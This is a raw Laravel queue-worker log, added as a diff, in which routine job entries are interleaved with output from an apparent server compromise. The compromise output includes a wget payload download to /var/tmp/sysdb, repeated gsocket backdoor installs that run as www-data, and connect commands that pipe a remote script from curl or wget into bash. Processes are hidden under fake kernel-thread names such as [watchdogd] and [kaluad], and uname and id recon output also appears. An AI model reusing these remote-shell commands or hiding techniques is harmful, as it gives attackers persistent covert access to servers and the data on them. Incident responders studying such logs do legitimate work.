+  2350K .......... .......... .......... .......... .......... 41% 36.0M 0s
+  2400K .......... .......... .......... .......... .......... 42% 22.4M 0s
+  2450K .......... .......... .......... .......... .......... 43% 30.4M 0s
+  2500K .......... .......... .......... .......... .......... 44% 33.5M 0s
+  2550K .......... .......... .......... .......... .......... 45% 32.2M 0s
+  2600K .......... .......... .......... .......... .......... 46% 20.1M 0s
+  2650K .......... .......... .......... .......... .......... 47% 60.9M 0s
+  2700K .......... .......... .......... .......... .......... 48% 23.7M 0s
+  2750K .......... .......... .......... .......... .......... 48% 21.5M 0s
+  2800K .......... .......... .......... .......... .......... 49% 48.9M 0s
+  2850K .......... .......... .......... .......... .......... 50% 23.9M 0s
+  2900K .......... .......... .......... .......... .......... 51% 28.0M 0s
+  2950K .......... .......... .......... .......... .......... 52% 27.1M 0s
+  3000K .......... .......... .......... .......... .......... 53% 33.2M 0s
+  3050K .......... .......... .......... .......... .......... 54% 22.3M 0s
+  3100K .......... .......... .......... .......... .......... 55% 29.4M 0s
+  3150K .......... .......... .......... .......... .......... 55% 37.5M 0s
+  3200K .......... .......... .......... .......... .......... 56% 21.8M 0s
+  3250K .......... .......... .......... .......... .......... 57% 38.2M 0s
+  3300K .......... .......... .......... .......... .......... 58% 28.6M 0s
+  3350K .......... .......... .......... .......... .......... 59% 29.1M 0s
+  3400K .......... .......... .......... .......... .......... 60% 40.3M 0s
+  3450K .......... .......... .......... .......... .......... 61% 21.9M 0s
+  3500K .......... .......... .......... .......... .......... 62% 41.0M 0s
+  3550K .......... .......... .......... .......... .......... 62% 23.0M 0s
+  3600K .......... .......... .......... .......... .......... 63% 32.3M 0s
+  3650K .......... .......... .......... .......... .......... 64% 19.1M 0s
+  3700K .......... .......... .......... .......... .......... 65% 50.2M 0s
+  3750K .......... .......... .......... .......... .......... 66% 32.6M 0s
+  3800K .......... .......... .......... .......... .......... 67% 21.6M 0s
+  3850K .......... .......... .......... .......... .......... 68% 40.9M 0s
+  3900K .......... .......... .......... .......... .......... 68% 25.7M 0s
+  3950K .......... .......... .......... .......... .......... 69% 37.0M 0s
+  4000K .......... .......... .......... .......... .......... 70% 23.2M 0s
+  4050K .......... .......... .......... .......... .......... 71% 27.2M 0s
+  4100K .......... .......... .......... .......... .......... 72% 22.8M 0s
+  4150K .......... .......... .......... .......... .......... 73% 27.7M 0s
+  4200K .......... .......... .......... .......... .......... 74% 51.9M 0s
+  4250K .......... .......... .......... .......... .......... 75% 24.2M 0s
+  4300K .......... .......... .......... .......... .......... 75% 34.2M 0s
+  4350K .......... .......... .......... .......... .......... 76% 26.7M 0s
+  4400K .......... .......... .......... .......... .......... 77% 2.61M 0s
+  4450K .......... .......... .......... .......... .......... 78% 26.8M 0s
+  4500K .......... .......... .......... .......... .......... 79% 24.8M 0s
+  4550K .......... .......... .......... .......... .......... 80% 32.0M 0s
+  4600K .......... .......... .......... .......... .......... 81% 36.6M 0s
+  4650K .......... .......... .......... .......... .......... 82% 31.1M 0s
+  4700K .......... .......... .......... .......... .......... 82% 31.1M 0s
+  4750K .......... .......... .......... .......... .......... 83% 28.3M 0s
+  4800K .......... .......... .......... .......... .......... 84% 21.8M 0s
+  4850K .......... .......... .......... .......... .......... 85% 36.0M 0s
+  4900K .......... .......... .......... .......... .......... 86% 39.8M 0s
+  4950K .......... .......... .......... .......... .......... 87% 11.8M 0s
+  5000K .......... .......... .......... .......... .......... 88% 21.2M 0s
+  5050K .......... .......... .......... .......... .......... 89% 39.7M 0s
+  5100K .......... .......... .......... .......... .......... 89%  444M 0s
+  5150K .......... .......... .......... .......... .......... 90% 10.8M 0s
+  5200K .......... .......... .......... .......... .......... 91% 54.2M 0s
+  5250K .......... .......... .......... .......... .......... 92%  852M 0s
+  5300K .......... .......... .......... .......... .......... 93% 12.6M 0s
+  5350K .......... .......... .......... .......... .......... 94%  519M 0s
+  5400K .......... .......... .......... .......... .......... 95%  177M 0s
+  5450K .......... .......... .......... .......... .......... 96% 26.9M 0s
+  5500K .......... .......... .......... .......... .......... 96% 32.9M 0s
+  5550K .......... .......... .......... .......... .......... 97% 30.5M 0s
+  5600K .......... .......... .......... .......... .......... 98% 32.6M 0s
+  5650K .......... .......... .......... .......... .......... 99% 22.7M 0s
+  5700K .......... .......... ....                            100% 31.2M=0.2s
+
+2026-02-04 19:05:09 (23.9 MB/s) - ‘/var/tmp/sysdb’ saved [5862152/5862152]
+
+  2026-02-04 19:05:09 App\Jobs\User\Views\RegisterResourceViews  387.01ms DONE
+  2026-02-04 19:09:16 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-02-04 19:09:16 App\Mail\User\Auth\RegistrationCodeMail .. 738.09ms DONE
+  2026-02-04 19:09:49 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-02-04 19:09:50 App\Mail\User\Auth\RegistrationCodeMail .. 667.36ms DONE
+  2026-02-04 19:12:53 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-04 19:12:53 App\Jobs\User\Views\RegisterResourceViews . 16.79ms DONE
+  2026-02-04 19:39:27 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-04 19:39:27 App\Jobs\User\Views\RegisterResourceViews . 22.86ms DONE
+  2026-02-05 03:09:06 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-05 03:09:06 App\Jobs\User\Views\RegisterResourceViews . 12.50ms DONE
+  2026-02-05 08:16:56 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-05 08:16:56 App\Jobs\User\Views\RegisterResourceViews .. 8.85ms DONE
+  2026-02-05 16:13:27 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-05 16:13:27 App\Jobs\User\Views\RegisterResourceViews . 18.28ms DONE
+  2026-02-05 16:45:49 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-05 16:45:49 App\Jobs\User\Views\RegisterResourceViews . 13.60ms DONE
+  2026-02-05 16:47:35 Illuminate\Notifications\Notification .......... RUNNING
+  2026-02-05 16:47:35 Illuminate\Notifications\Notification ...... 2.30ms DONE
+  2026-02-05 16:48:11 Illuminate\Notifications\Notification .......... RUNNING
+  2026-02-05 16:48:12 Illuminate\Notifications\Notification .... 545.94ms DONE
+  2026-02-05 17:48:52 Illuminate\Notifications\Notification .......... RUNNING
+chmod: cannot access '/tmp/systemd': No such file or directory
+  2026-02-05 17:48:53 Illuminate\Notifications\Notification .... 615.23ms DONE
+  2026-02-05 18:42:27 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+--> WARNING: HOME not set. Using 'HOME=/var/www'
+--> Trying x86_64-alpine
+Downloading binaries........................................................[OK]
+Unpacking binaries..........................................................[OK]
+Copying binaries............................................................[OK]
+Testing binaries............................................................[OK]
+Testing Global Socket Relay Network...................................--> Access will be lost after reboot.
+......[OK]
+Installing remote access................................................[FAILED]
+--> Set GS_DSTDIR= to a writeable & executable directory.
+Executing webhooks....................................................[SKIPPING]
+--> To uninstall use GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)"
+--> To connect use one of the following:
+--> gs-netcat -s "GKZuJwUn8QmMGV7E6Wkttv" -i
+--> S="GKZuJwUn8QmMGV7E6Wkttv" bash -c "$(curl -fsSL https://gsocket.io/y)"
+--> S="GKZuJwUn8QmMGV7E6Wkttv" bash -c "$(wget -qO- https://gsocket.io/y)"
+Starting 'defunct' as hidden process '[watchdogd]'..........................[OK]
+--> WARNING: More than one [watchdogd] is running.
+--> You may want to check: ps -elf|grep -E -- '(\[kstrp\]|\[watchdogd\]|\[ksmd\]|\[kswapd0\]|\[card0\-crtc8\]|\[mm\_percpu\_wq\]|\[rcu\_preempt\]|\[kworker\]|\[raid5wq\]|\[slub\_flushwq\]|\[netns\]|\[kaluad\])'
+--> or terminate the old ones: kill 108566 108567 108898 108899 113948 113949 114020 114021 114157 114158 114340 114341 118514 118515 150945 150947 152996 152997
+--> Join us on Telegram - https://t.me/thcorg
+  2026-02-05 18:42:28 App\Mail\User\Auth\RegistrationCodeMail .. 622.12ms FAIL
+  2026-02-05 18:42:28 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-02-05 18:42:28 App\Mail\User\Auth\RegistrationCodeMail ... 86.89ms FAIL
+  2026-02-05 18:42:28 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-02-05 18:42:28 App\Mail\User\Auth\RegistrationCodeMail ... 29.79ms FAIL
+  2026-02-05 19:46:52 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-02-05 19:46:54 App\Mail\User\Auth\RegistrationCodeMail ........ 1s DONE
+  2026-02-05 20:55:22 Illuminate\Notifications\Notification .......... RUNNING
+  2026-02-05 20:55:22 Illuminate\Notifications\Notification ...... 1.35ms DONE
+  2026-02-05 20:55:22 Illuminate\Notifications\Notification .......... RUNNING
+--> WARNING: HOME not set. Using 'HOME=/var/www'
+--> Trying x86_64-alpine
+Downloading binaries........................................................[OK]
+Unpacking binaries..........................................................[OK]
+Copying binaries............................................................[OK]
+Testing binaries............................................................[OK]
+Testing Global Socket Relay Network...................................--> Access will be lost after reboot.
+......[OK]
+Installing remote access................................................[FAILED]
+--> Set GS_DSTDIR= to a writeable & executable directory.
+Executing webhooks....................................................[SKIPPING]
+--> To uninstall use GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)"
+--> To connect use one of the following:
+--> gs-netcat -s "8FYL1tBarqioUZZ8dRBQQZ" -i
+--> S="8FYL1tBarqioUZZ8dRBQQZ" bash -c "$(curl -fsSL https://gsocket.io/y)"
+--> S="8FYL1tBarqioUZZ8dRBQQZ" bash -c "$(wget -qO- https://gsocket.io/y)"
+Starting 'defunct' as hidden process '[kaluad]'.............................[OK]
+--> WARNING: More than one [kaluad] is running.
+--> You may want to check: ps -elf|grep -E -- '(\[kstrp\]|\[watchdogd\]|\[ksmd\]|\[kswapd0\]|\[card0\-crtc8\]|\[mm\_percpu\_wq\]|\[rcu\_preempt\]|\[kworker\]|\[raid5wq\]|\[slub\_flushwq\]|\[netns\]|\[kaluad\])'
+--> or terminate the old ones: kill 108566 108567 108898 108899 113948 113949 114020 114021 114157 114158 114340 114341 118514 118515 150945 150947 152996 152997 153234 153235 155517 155521 155543 155544
+--> Join us on Telegram - https://t.me/thcorg
+  2026-02-05 20:55:23 Illuminate\Notifications\Notification .... 504.97ms DONE
+  2026-02-06 02:04:13 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+--> WARNING: HOME not set. Using 'HOME=/var/www'
+--> Trying x86_64-alpine
+Downloading binaries........................................................[OK]
+Unpacking binaries..........................................................[OK]
+Copying binaries............................................................[OK]
+Testing binaries............................................................[OK]
+Testing Global Socket Relay Network...................................--> Access will be lost after reboot.
+......[OK]
+Installing remote access................................................[FAILED]
+--> Set GS_DSTDIR= to a writeable & executable directory.
+Executing webhooks....................................................[SKIPPING]
+--> To uninstall use GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)"
+--> To connect use one of the following:
+--> gs-netcat -s "wNN34oWE9NHXes5aKBcwHW" -i
+--> S="wNN34oWE9NHXes5aKBcwHW" bash -c "$(curl -fsSL https://gsocket.io/y)"
+--> S="wNN34oWE9NHXes5aKBcwHW" bash -c "$(wget -qO- https://gsocket.io/y)"
+Starting 'defunct' as hidden process '[kstrp]'..............................[OK]
+--> WARNING: More than one [kstrp] is running.
+--> You may want to check: ps -elf|grep -E -- '(\[kstrp\]|\[watchdogd\]|\[ksmd\]|\[kswapd0\]|\[card0\-crtc8\]|\[mm\_percpu\_wq\]|\[rcu\_preempt\]|\[kworker\]|\[raid5wq\]|\[slub\_flushwq\]|\[netns\]|\[kaluad\])'
+--> or terminate the old ones: kill 108566 108567 108898 108899 113948 113949 114020 114021 114157 114158 114340 114341 118514 118515 150945 150947 152996 152997 153234 153235 155517 155521 155543 155544 155724 155725
+--> Join us on Telegram - https://t.me/thcorg
+  2026-02-06 02:04:16 App\Mail\User\Auth\RegistrationCodeMail ........ 2s DONE
+  2026-02-06 02:52:37 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-06 02:52:37 App\Jobs\User\Views\RegisterResourceViews . 16.66ms DONE
+  2026-02-06 05:19:59 Illuminate\Notifications\Notification .......... RUNNING
+  2026-02-06 05:19:59 Illuminate\Notifications\Notification ...... 2.32ms DONE
+  2026-02-06 05:19:59 Illuminate\Notifications\Notification .......... RUNNING
+Linux host 5.15.0-164-generic #174-Ubuntu SMP Fri Nov 14 20:25:16 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+  2026-02-06 05:19:59 Illuminate\Notifications\Notification ..... 14.75ms DONE
+  2026-02-06 05:19:59 Illuminate\Notifications\Notification .......... RUNNING
+Linux host 5.15.0-164-generic #174-Ubuntu SMP Fri Nov 14 20:25:16 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+  2026-02-06 05:19:59 Illuminate\Notifications\Notification ...... 3.93ms DONE
+  2026-02-06 07:06:59 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-06 07:06:59 App\Jobs\User\Views\RegisterResourceViews .. 6.84ms DONE
+  2026-02-06 12:33:54 Illuminate\Notifications\Notification .......... RUNNING
+  2026-02-06 12:33:54 Illuminate\Notifications\Notification ...... 0.95ms DONE
+  2026-02-06 12:33:54 Illuminate\Notifications\Notification .......... RUNNING
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+  2026-02-06 12:33:54 Illuminate\Notifications\Notification ...... 9.41ms DONE
+  2026-02-06 14:40:54 Illuminate\Notifications\Notification .......... RUNNING
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+  2026-02-06 14:40:54 Illuminate\Notifications\Notification ..... 12.01ms DONE
+  2026-02-06 14:40:54 Illuminate\Notifications\Notification .......... RUNNING
+--> WARNING: HOME not set. Using 'HOME=/var/www'
+--> Trying x86_64-alpine
+Downloading binaries........................................................[OK]
+Unpacking binaries..........................................................[OK]
+Copying binaries............................................................[OK]
+Testing binaries............................................................[OK]
+Testing Global Socket Relay Network...................................--> Access will be lost after reboot.
+......[OK]
+Installing remote access................................................[FAILED]
+--> Set GS_DSTDIR= to a writeable & executable directory.
+Executing webhooks....................................................[SKIPPING]
+--> To uninstall use GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)"
+--> To connect use one of the following:
+--> gs-netcat -s "6WVW4jg1Agf7L3R8TC9Cf5" -i
+--> S="6WVW4jg1Agf7L3R8TC9Cf5" bash -c "$(curl -fsSL https://gsocket.io/y)"
+--> S="6WVW4jg1Agf7L3R8TC9Cf5" bash -c "$(wget -qO- https://gsocket.io/y)"
+Starting 'defunct' as hidden process '[mm_percpu_wq]'.......................[OK]
+--> WARNING: More than one [mm_percpu_wq] is running.
+--> You may want to check: ps -elf|grep -E -- '(\[kstrp\]|\[watchdogd\]|\[ksmd\]|\[kswapd0\]|\[card0\-crtc8\]|\[mm\_percpu\_wq\]|\[rcu\_preempt\]|\[kworker\]|\[raid5wq\]|\[slub\_flushwq\]|\[netns\]|\[kaluad\])'
+--> or terminate the old ones: kill 108566 108567 108898 108899 113948 113949 114020 114021 114157 114158 114340 114341 118514 118515 150945 150947 152996 152997 153234 153235 155517 155521 155543 155544 155724 155725 160624 160625 174859 174861
+--> Join us on Telegram - https://t.me/thcorg
+  2026-02-06 14:40:54 Illuminate\Notifications\Notification .... 657.37ms DONE
+  2026-02-06 14:52:24 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+Linux host 5.15.0-164-generic #174-Ubuntu SMP Fri Nov 14 20:25:16 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+  2026-02-06 14:52:24 App\Jobs\User\Views\RegisterResourceViews . 13.16ms DONE
+  2026-02-06 17:49:34 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+--> WARNING: HOME not set. Using 'HOME=/var/www'
+--> Trying x86_64-alpine
+Downloading binaries........................................................[OK]
+Unpacking binaries..........................................................[OK]
+Copying binaries............................................................[OK]
+Testing binaries............................................................[OK]
+Testing Global Socket Relay Network.........................................[OK]
+--> Access will be lost after reboot.
+Installing remote access................................................[FAILED]
+--> Set GS_DSTDIR= to a writeable & executable directory.
+Executing webhooks....................................................[SKIPPING]
+--> To uninstall use GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)"
+--> To connect use one of the following:
+--> gs-netcat -s "D68Rc9kSyjKVdDRXAV67vu" -i
+--> S="D68Rc9kSyjKVdDRXAV67vu" bash -c "$(curl -fsSL https://gsocket.io/y)"
+--> S="D68Rc9kSyjKVdDRXAV67vu" bash -c "$(wget -qO- https://gsocket.io/y)"
+Starting 'defunct' as hidden process '[netns]'..............................[OK]
+--> WARNING: More than one [netns] is running.
+--> You may want to check: ps -elf|grep -E -- '(\[kstrp\]|\[watchdogd\]|\[ksmd\]|\[kswapd0\]|\[card0\-crtc8\]|\[mm\_percpu\_wq\]|\[rcu\_preempt\]|\[kworker\]|\[raid5wq\]|\[slub\_flushwq\]|\[netns\]|\[kaluad\])'
+--> or terminate the old ones: kill 108566 108567 108898 108899 113948 113949 114020 114021 114157 114158 114340 114341 118514 118515 150945 150947 152996 152997 153234 153235 155517 155521 155543 155544 155724 155725 160624 160625 174859 174861 175187 175188
+--> Join us on Telegram - https://t.me/thcorg
+  2026-02-06 17:49:34 App\Jobs\User\Views\RegisterResourceViews  772.64ms DONE
+  2026-02-06 18:09:53 Illuminate\Notifications\Notification .......... RUNNING
+  2026-02-06 18:09:53 Illuminate\Notifications\Notification ...... 0.81ms DONE
+  2026-02-06 20:32:03 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+  2026-02-06 20:32:03 App\Jobs\User\Views\RegisterResourceViews . 30.22ms DONE
+  2026-02-06 22:44:21 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-06 22:44:21 App\Jobs\User\Views\RegisterResourceViews . 10.19ms DONE
+  2026-02-07 00:27:02 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-07 00:27:02 App\Jobs\User\Views\RegisterResourceViews . 12.52ms DONE
+  2026-02-07 02:25:29 Illuminate\Notifications\Notification .......... RUNNING
+  2026-02-07 02:25:29 Illuminate\Notifications\Notification ...... 0.80ms DONE
+  2026-02-07 02:55:45 Illuminate\Notifications\Notification .......... RUNNING
+  2026-02-07 02:55:45 Illuminate\Notifications\Notification ...... 0.96ms DONE
+  2026-02-07 04:59:17 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-07 04:59:18 App\Jobs\User\Views\RegisterResourceViews  240.48ms DONE
+  2026-02-07 04:59:18 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-07 04:59:18 App\Jobs\User\Views\RegisterResourceViews .. 5.63ms DONE
+  2026-02-07 05:11:53 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-07 05:11:53 App\Jobs\User\Views\RegisterResourceViews  275.65ms DONE
+  2026-02-07 14:24:57 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-07 14:24:57 App\Jobs\User\Views\RegisterResourceViews .. 9.51ms DONE
+  2026-02-07 14:25:15 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-07 14:25:15 App\Jobs\User\Views\RegisterResourceViews . 19.99ms DONE
+  2026-02-07 17:37:09 Illuminate\Notifications\Notification .......... RUNNING
+  2026-02-07 17:37:09 Illuminate\Notifications\Notification ...... 3.28ms DONE
+  2026-02-07 17:37:09 Illuminate\Notifications\Notification .......... RUNNING
+www-data
+  2026-02-07 17:37:09 Illuminate\Notifications\Notification ...... 2.76ms DONE
+  2026-02-07 20:47:16 Illuminate\Notifications\Notification .......... RUNNING
+  2026-02-07 20:47:16 Illuminate\Notifications\Notification ...... 1.47ms DONE
+  2026-02-07 20:47:16 Illuminate\Notifications\Notification .......... RUNNING
+--> WARNING: HOME not set. Using 'HOME=/var/www'
+--> Trying x86_64-alpine
+Downloading binaries....................................................[FAILED]
+
+  2026-02-07 20:47:17 Illuminate\Notifications\Notification .... 547.03ms DONE
+  2026-02-07 23:46:42 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+www-data
+  2026-02-07 23:46:42 App\Jobs\User\Views\RegisterResourceViews . 19.86ms DONE
+  2026-02-08 10:53:15 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-08 10:53:15 App\Jobs\User\Views\RegisterResourceViews . 30.58ms DONE
+  2026-02-08 12:46:08 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-02-08 12:46:09 App\Mail\User\Auth\RegistrationCodeMail .. 947.65ms DONE
+  2026-02-08 13:25:31 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+--> WARNING: HOME not set. Using 'HOME=/var/www'
+--> Trying x86_64-alpine
+Downloading binaries........................................................[OK]
+Unpacking binaries..........................................................[OK]
+Copying binaries............................................................[OK]
+Testing binaries............................................................[OK]
+Testing Global Socket Relay Network...................................--> Access will be lost after reboot.
+......[OK]
+Installing remote access................................................[FAILED]
+--> Set GS_DSTDIR= to a writeable & executable directory.
+Executing webhooks....................................................[SKIPPING]
+--> To uninstall use GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)"
+--> To connect use one of the following:
+--> gs-netcat -s "3TUa8yh2pqDnTscC5HSNtv" -i
+--> S="3TUa8yh2pqDnTscC5HSNtv" bash -c "$(curl -fsSL https://gsocket.io/y)"
+--> S="3TUa8yh2pqDnTscC5HSNtv" bash -c "$(wget -qO- https://gsocket.io/y)"
+Starting 'defunct' as hidden process '[netns]'..............................[OK]
+--> WARNING: More than one [netns] is running.
+--> You may want to check: ps -elf|grep -E -- '(\[kstrp\]|\[watchdogd\]|\[ksmd\]|\[kswapd0\]|\[card0\-crtc8\]|\[mm\_percpu\_wq\]|\[rcu\_preempt\]|\[kworker\]|\[raid5wq\]|\[slub\_flushwq\]|\[netns\]|\[kaluad\])'
+--> or terminate the old ones: kill 108566 108567 108898 108899 113948 113949 114020 114021 114157 114158 114340 114341 118514 118515 150945 150947 152996 152997 153234 153235 155517 155521 155543 155544 155724 155725 160624 160625 174859 174861 175187 175188 177599 177600
+--> Join us on Telegram - https://t.me/thcorg
+  2026-02-08 13:25:31 App\Jobs\User\Views\RegisterResourceViews  631.86ms DONE
+  2026-02-08 16:15:38 Illuminate\Notifications\Notification .......... RUNNING
+  2026-02-08 16:15:38 Illuminate\Notifications\Notification ...... 0.95ms DONE
